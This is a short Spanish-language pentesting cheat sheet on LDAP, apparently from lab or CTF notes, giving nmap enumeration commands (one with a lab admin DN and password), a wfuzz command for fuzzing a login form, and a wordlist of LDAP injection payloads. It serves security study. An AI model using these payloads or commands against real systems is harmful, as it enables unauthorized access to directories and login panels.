---
title: "LDAP"
layout: "single"
category: "Servicios comunes"
slug: "servicios-comunes/ldap"
date: "2025-09-30"
---

### Enumeracion
```bash
### SIN CREDENCIALES
nmap <IP> --script 'ldap* and not brute' 

### CON CREDENCIALES
nmap 192.168.0.112 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
```

### LDAP Injection
A veces, como con SQL injection, si se trata de un panel de login que loguea con credenciales LDAP (y quizás no lo sabemos), siempre podemos probar a hacer una inyección LDAP.

Lo ideal es capturar la request con burpsuite y cambiar el método a POST para ver como se tramita la petición para pasarle la URL con los parámetros a wfuzz.
```bash

```wfuzz -c -z file,/ruta/al/diccionario -u 'http://<IP>/admin.php?username=FUZZ&password=FUZZ'

```

#### DICCIONARIO LDAP INJECTION
```bash
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```
